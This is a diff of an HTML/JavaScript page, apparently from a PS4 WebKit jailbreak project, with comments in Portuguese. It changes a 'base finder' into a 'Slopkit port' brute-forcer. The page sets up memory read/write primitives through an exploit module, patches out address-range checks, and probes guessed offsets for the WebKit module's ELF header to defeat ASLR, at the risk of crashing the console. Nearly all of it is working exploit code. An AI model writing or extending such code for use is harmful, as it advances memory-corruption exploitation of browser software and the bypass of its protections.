@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PS4 WebKit — Base Finder</title>
+<title>PS4 WebKit — Slopkit Port + Brute Force Base</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body {
@@ -18,14 +17,14 @@
     gap: 14px;
     padding: 20px;
   }
-  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
+  h1 { color: #fff; font-size: 20px; letter-spacing: 0.5px; }
   #status {
-    font-size: 20px; font-weight: 700; color: #fff;
+    font-size: 18px; font-weight: 700; color: #fff;
     min-height: 1.5em;
     text-align: center;
   }
   #log {
-    width: 95%; max-width: 900px; height: 520px;
+    width: 95%; max-width: 900px; height: 400px;
     background: #111827; border: 1px solid #1f2937;
     border-radius: 10px; padding: 14px 16px;
     overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
@@ -37,36 +36,59 @@
   #log .err { color: #f87171; }
   #log .info { color: #60a5fa; }
   #log .warn { color: #fbbf24; }
-  #actions {
-    display: flex; gap: 12px; flex-wrap: wrap;
-    justify-content: center;
+  #guesses {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    justify-content: center; max-width: 900px;
   }
-  button {
-    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
-    border-radius: 12px; color: #fff;
-    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
-    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
+  .guess-btn {
+    padding: 10px 16px; border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 8px; color: #fff;
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    box-shadow: 0 4px 12px rgba(220,38,38,0.28);
+    font: 700 13px/1 "Segoe UI", system-ui, sans-serif;
     cursor: pointer; transition: all .12s ease;
+    min-width: 140px;
   }
-  button:hover { transform: translateY(-2px); }
-  button:active { transform: translateY(1px); }
-  button:disabled {
+  .guess-btn:hover { transform: translateY(-2px); }
+  .guess-btn:active { transform: translateY(1px); }
+  .guess-btn:disabled {
     opacity: 0.45; cursor: not-allowed; transform: none;
     background: #374151; box-shadow: none;
   }
+  .guess-btn.found {
+    background: linear-gradient(135deg, #22c55e, #15803d);
+    box-shadow: 0 4px 12px rgba(34,197,94,0.28);
+  }
+  #warning {
+    color: #fbbf24; font-size: 14px; text-align: center;
+    max-width: 800px; line-height: 1.5;
+  }
+  #controls {
+    display: flex; gap: 10px; flex-wrap: wrap;
+    justify-content: center;
+  }
+  .ctrl-btn {
+    padding: 8px 14px; border-radius: 6px; border: none;
+    background: #1f2937; color: #fff; cursor: pointer;
+    font-size: 12px;
+  }
+  .ctrl-btn:hover { background: #374151; }
 </style>
 </head>
 <body>
 
-<h1>PS4 WebKit — Base Finder (Safe)</h1>
+<h1>PS4 WebKit — Slopkit Port + Brute Force Base</h1>
 <div id="status">Inicializando...</div>
 <div id="log"></div>
-<div id="actions">
-  <button id="btnFind" disabled>Find Base</button>
-  <button id="btnInfo" disabled>Show Info</button>
-  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
+<div id="warning">
+  ⚠️ Cada botão testa <b>1 endereço</b>. Se o endereço não estiver mapeado, o PS4 <b>vai crashar</b>.<br>
+  Anote qual você testou. Se crashar, reinicie o PS4 e tente outro.
 </div>
+<div id="controls">
+  <button class="ctrl-btn" onclick="autoBruteForce()">🔎 Auto Brute Force</button>
+  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar Log</button>
+</div>
+<div id="guesses"></div>
 
 <script type="module">
   import { establishPrimitive } from "./resources/core.js";
@@ -75,8 +97,7 @@
 
   const status = document.getElementById("status");
   const logBox = document.getElementById("log");
-  const btnFind = document.getElementById("btnFind");
-  const btnInfo = document.getElementById("btnInfo");
+  const guessesDiv = document.getElementById("guesses");
 
   function log(msg, cls = "info") {
     const line = document.createElement("div");
@@ -88,152 +109,178 @@
 
   window.clearLog = function() {
     logBox.innerHTML = "";
+    log("Log limpo.", "info");
   };
 
-  function onCoreEvent(tag, detail) {
-    log(`${tag}: ${detail}`, "info");
-  }
-
-  function onMemEvent(tag, detail) {
-    log(`${tag}: ${detail}`, "info");
-  }
-
-  // Safe read4
-  function safeRead4(p, addr) {
-    try { return p.read4(addr); } catch (e) { return null; }
-  }
-
-  // ========== SHOW INFO ==========
-  window.showInfo = function() {
-    const p = window.p;
-    if (!p) { log("window.p não disponível", "err"); return; }
-
-    log("=== INFO ===", "ok");
-    log(`User-Agent: ${navigator.userAgent}`, "info");
-
-    let ctor = globalThis.__ps5NativeCtor;
-    if (ctor) {
-      log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
-      window.__ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
+  // ========== PATCH PS4: Remove restrição de faixa PS5 do carrier ==========
+  function patchCarrierPS4(carrier) {
+    if (!carrier || typeof carrier.aim !== "function") {
+      log("Carrier não encontrado ou sem método aim", "err");
+      return carrier;
     }
 
-    let textarea = document.createElement("textarea");
-    let textAddr = p.leakval(textarea);
-    let vtablePtr = p.read8(textAddr.add32(0x18));
-    let e0 = p.read8(vtablePtr);
-    log(`vtable[0] = 0x${e0.toString(16)}`, "info");
+    const originalAim = carrier.aim.bind(carrier);
+    carrier.aim = function(address) {
+      // No PS4, endereços válidos podem estar na faixa low (0x00xxxxxx)
+      // ou high (0x80xxxxxx+). Removemos a restrição PS5 que exige
+      // address >= 0x800000000.
+      // Apenas garantimos que é um número finito.
+      if (typeof address !== "number" || !Number.isFinite(address)) {
+        throw new RangeError("mem.pair.aim: invalid address " + address);
+      }
+      // Chama o aim original sem filtros de faixa
+      return originalAim(address);
+    };
 
-    // Calculate delta
-    if (window.__ctorAddr) {
-      let delta = e0.sub32(window.__ctorAddr.low);
-      log(`Delta vtable[0] - ctor = 0x${(e0.low - window.__ctorAddr.low).toString(16)}`, "info");
-    }
+    log("Carrier patchado para endereçamento PS4 (low ASLR)", "ok");
+    return carrier;
+  }
+
+  // ========== CONFIGURAÇÃO DE OFFSETS (PS4) ==========
+  // Ajuste esses offsets conforme seu dump do PS4 13.50
+  const PS4_OFFSETS = {
+    wk_host_constructor_candidates: [
+      { off: 0x00800000, label: "-8MB" },
+      { off: 0x01000000, label: "-16MB" },
+      { off: 0x01800000, label: "-24MB" },
+      { off: 0x02000000, label: "-32MB" },
+      { off: 0x02800000, label: "-40MB" },
+      { off: 0x03000000, label: "-48MB" },
+      { off: 0x03800000, label: "-56MB" },
+    ],
+    // Se você souber o offset exato do __ps5NativeCtor relativo à base,
+    // coloque aqui para pular direto:
+    known_ctor_offset: null // ex: 0x01e401e20
   };
 
-  // ========== FIND BASE ==========
-  window.findBase = function() {
+  // ========== TESTAR 1 BASE ==========
+  window.testBase = function(baseHex, label) {
     const p = window.p;
-    if (!p) { log("window.p não disponível", "err"); return; }
+    if (!p) { log("window.p não disponível!", "err"); return Promise.resolve(false); }
 
-    let ctor = globalThis.__ps5NativeCtor;
-    if (!ctor) { log("__ps5NativeCtor not available", "err"); return; }
+    log(`=== TESTANDO ${label} ===`, "warn");
+    log(`Lendo ELF magic @ ${baseHex}...`, "info");
 
-    let ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
-    log(`__ps5NativeCtor = 0x${ctorAddr.toString(16)}`, "ok");
+    try {
+      let low = parseInt(baseHex.slice(-8), 16);
+      let hi = parseInt(baseHex.slice(0, -8) || "0", 16);
+      let addr = new int64(low, hi);
 
-    // Chutes razoáveis: o módulo WebKit tem 20-60MB.
-    // Vamos testar bases a 8MB, 16MB, 24MB, 32MB, 40MB, 48MB do ctor
-    let guesses = [
-      0x00800000,  // 8MB
-      0x01000000,  // 16MB
-      0x01800000,  // 24MB
-      0x02000000,  // 32MB
-      0x02800000,  // 40MB
-      0x03000000,  // 48MB
-      0x03800000,  // 56MB
-    ];
+      let magic = p.read4(addr);
+      let magicHex = "0x" + magic.toString(16).padStart(8, '0');
 
-    log("Testing base guesses (1MB scan each, 0x4000 steps)...", "info");
+      log(`Magic: ${magicHex}`, "info");
 
-    for (let guessOffset of guesses) {
-      let guessBase = new int64(
-        (ctor - guessOffset) % 0x100000000,
-        Math.floor((ctor - guessOffset) / 0x100000000)
-      );
-      // Align to 0x4000
-      let alignedLow = guessBase.low & 0xFFFFC000;
-      let aligned = new int64(alignedLow, guessBase.hi);
+      if (magicHex === "0x464c457f") {
+        log(`✅ ELF ENCONTRADO @ ${baseHex} !!!`, "ok");
+        window.__webkitBase = addr;
 
-      log(`Trying base ~ 0x${aligned.toString(16)} (offset -0x${guessOffset.toString(16)})`, "info");
+        let eiClass = p.read1(addr.add32(4));
+        let eiData = p.read1(addr.add32(5));
+        log(`ELF class=${eiClass} data=${eiData}`, "ok");
 
-      // Scan 1MB forward from guess
-      let found = false;
-      for (let i = 0; i < 64; i++) { // 64 * 0x4000 = 1MB
-        let candidate = aligned.add32(i * 0x4000);
-        let magic = safeRead4(p, candidate);
-        if (magic === 0x464c457f) {
-          log(`  ELF FOUND @ 0x${candidate.toString(16)} !!!`, "ok");
-          window.__webkitBase = candidate;
-          found = true;
+        document.querySelectorAll('.guess-btn').forEach(btn => {
+          if (btn.dataset.base === baseHex) btn.classList.add('found');
+        });
 
-          // Quick validation: read e_ident
-          let eiClass = p.read1(candidate.add32(4));
-          let eiData = p.read1(candidate.add32(5));
-          log(`  ELF class=${eiClass} data=${eiData}`, "ok");
-
-          // Dump header hex
-          let hex = "";
-          for (let j = 0; j < 0x40; j += 4) {
-            hex += p.read4(candidate.add32(j)).toString(16).padStart(8, '0') + " ";
+        let ctor = globalThis.__ps5NativeCtor;
+        if (ctor) {
+          let ctorOffset = ctor - addr.low;
+          if (addr.hi === 0) {
+            log(`__ps5NativeCtor offset = 0x${ctorOffset.toString(16)}`, "ok");
+            // Salva o offset descoberto para futuras execuções
+            PS4_OFFSETS.known_ctor_offset = ctorOffset;
           }
-          log(`  Header: ${hex}`, "info");
-
-          // Calculate exact offset of __ps5NativeCtor
-          let ctorOffset = ctorAddr.sub32(candidate.low);
-          log(`  __ps5NativeCtor offset = 0x${ctorOffset.low.toString(16)}`, "ok");
-
-          break;
         }
-      }
-      if (found) break;
 
-      // Also try 1MB backward (in case we overshot)
-      for (let i = 1; i <= 64; i++) {
-        let candidate = aligned.sub32(i * 0x4000);
-        // Don't go below 0x800000000
-        if (candidate.hi < 0x8) break;
-        let magic = safeRead4(p, candidate);
-        if (magic === 0x464c457f) {
-          log(`  ELF FOUND (backward) @ 0x${candidate.toString(16)} !!!`, "ok");
-          window.__webkitBase = candidate;
-          found = true;
-          break;
-        }
+        status.textContent = `✅ Base encontrada: ${baseHex}`;
+        status.style.color = "#4ade80";
+        return true;
+      } else {
+        log(`❌ Não é ELF (magic=${magicHex})`, "err");
+        return false;
       }
-      if (found) break;
-    }
-
-    if (!window.__webkitBase) {
-      log("ELF not found in any guess range.", "err");
-      log("The module might be mapped at an unusual address.", "warn");
-      log("Alternative: use nm/objdump on libSceWebKit2 binary.", "warn");
+    } catch (e) {
+      log(`❌ FALHA: ${e.name}: ${e.message}`, "err");
+      return false;
     }
   };
 
-  btnFind.onclick = window.findBase;
-  btnInfo.onclick = window.showInfo;
+  // ========== CRIAR BOTÕES ==========
+  function createButtons(ctor) {
+    guessesDiv.innerHTML = "";
+    const offsets = PS4_OFFSETS.wk_host_constructor_candidates.slice();
+
+    // Se tivermos um offset conhecido, adiciona um botão "DIRETO"
+    if (PS4_OFFSETS.known_ctor_offset) {
+      let base = (ctor - PS4_OFFSETS.known_ctor_offset) & 0xFFFFFFFFFFFFC000;
+      let baseHex = "0x" + base.toString(16).padStart(16, '0');
+      offsets.unshift({ off: PS4_OFFSETS.known_ctor_offset, label: "⭐ DIRETO" });
+    }
+
+    offsets.forEach(({ off, label }) => {
+      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
+      let baseHex = "0x" + base.toString(16).padStart(16, '0');
+
+      let btn = document.createElement("button");
+      btn.className = "guess-btn";
+      btn.dataset.base = baseHex;
+      btn.textContent = `${label}\n${baseHex}`;
+      btn.style.whiteSpace = "pre";
+      btn.onclick = () => {
+        document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
+        testBase(baseHex, label).then(ok => {
+          if (!ok) document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
+        });
+      };
+      guessesDiv.appendChild(btn);
+    });
+  }
+
+  // ========== AUTO BRUTE FORCE ==========
+  window.autoBruteForce = async function() {
+    const p = window.p;
+    const ctor = globalThis.__ps5NativeCtor;
+    if (!p || !ctor) {
+      log("Primitivas não disponíveis para brute force", "err");
+      return;
+    }
+
+    log("🔎 Iniciando Auto Brute Force...", "warn");
+    const offsets = PS4_OFFSETS.wk_host_constructor_candidates;
+
+    for (const { off, label } of offsets) {
+      let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
+      let baseHex = "0x" + base.toString(16).padStart(16, '0');
+      log(`Tentando ${label} (${baseHex})...`, "info");
+
+      let ok = await testBase(baseHex, label);
+      if (ok) {
+        log("🎯 Base encontrada via Auto Brute Force!", "ok");
+        return;
+      }
+      // Pequena pausa entre tentativas
+      await new Promise(r => setTimeout(r, 100));
+    }
+
+    log("❌ Auto Brute Force falhou em todos os offsets.", "err");
+    document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
+  };
 
   // ========== BOOTSTRAP ==========
-  log("Carregando módulos...", "ok");
+  log("Carregando módulos slopkit...", "ok");
   status.textContent = "Executando exploit...";
 
-  establishPrimitive({ onEvent: onCoreEvent })
+  establishPrimitive({ onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info") })
     .then(carrier => {
       log("Core: primitivo estabelecido", "ok");
       log(`Tentativas: ${carrier.attempts}`, "info");
 
+      // PATCH CRÍTICO PS4
+      patchCarrierPS4(carrier);
+
       const prim = installWindowP(carrier, {
-        onEvent: onMemEvent,
+        onEvent: (tag, detail) => log(`${tag}: ${detail}`, "info"),
         promote: true
       });
 
@@ -242,12 +289,20 @@
 
       window.__carrier = carrier;
       window.__prim = prim;
+      window.p = prim;
       window.int64 = int64;
 
-      status.textContent = "RW Primitivo OK";
-      status.style.color = "#4ade80";
-      btnFind.disabled = false;
-      btnInfo.disabled = false;
+      let ctor = globalThis.__ps5NativeCtor;
+      if (ctor) {
+        log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
+        createButtons(ctor);
+        status.textContent = "Clique em um botão ou use Auto Brute Force";
+        status.style.color = "#60a5fa";
+      } else {
+        log("__ps5NativeCtor não disponível", "err");
+        status.textContent = "Erro: __ps5NativeCtor não encontrado";
+        status.style.color = "#f87171";
+      }
 
       try {
         const testAddr = prim.leakval(prim);
@@ -257,7 +312,7 @@
       }
     })
     .catch(err => {
-      log(`FALHA: ${err.name}: ${e.message}`, "err");
+      log(`FALHA: ${err.name}: ${err.message}`, "err");
       status.textContent = "Falha no exploit";
       status.style.color = "#f87171";
     });
